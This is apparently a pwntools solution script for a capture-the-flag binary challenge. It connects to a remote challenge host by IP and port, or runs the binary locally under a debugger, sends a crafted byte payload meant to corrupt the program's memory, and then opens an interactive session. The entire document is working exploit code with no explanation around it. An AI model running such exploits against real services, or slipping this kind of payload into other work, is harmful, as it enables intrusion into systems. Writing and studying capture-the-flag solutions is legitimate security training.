#!/usr/bin/env python3

from pwn import *

exe = ELF("./chall_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

context.binary = exe
context.terminal = "alacritty -e".split()


def conn():
    if args.REMOTE:
        io = remote("34.170.104.126", 5000)
    else:
        if args.GDB:
            io = gdb.debug([exe.path], aslr=False, api=False, gdbscript="""
            set follow-fork-mode parent
            """)
        else:
            io = process([exe.path])
            #gdb.attach(io)
    return io


def main(io):
    payload = b""
    for i in range(0x28):
        payload += p8(-16-i, sign=True)
    payload += p8(-16-0x28+1, sign=True)
    payload += b"\x00" * 0x61 + b"\x01" * 0x54 + b"\x02" * 0xc + b"\xfa" * 0xff
    assert len(payload) < 0x200
    io.sendline(payload)
    
    io.recvuntil(b"\xe5")
    io.interactive()


if __name__ == "__main__":
    io = conn()
    main(io)
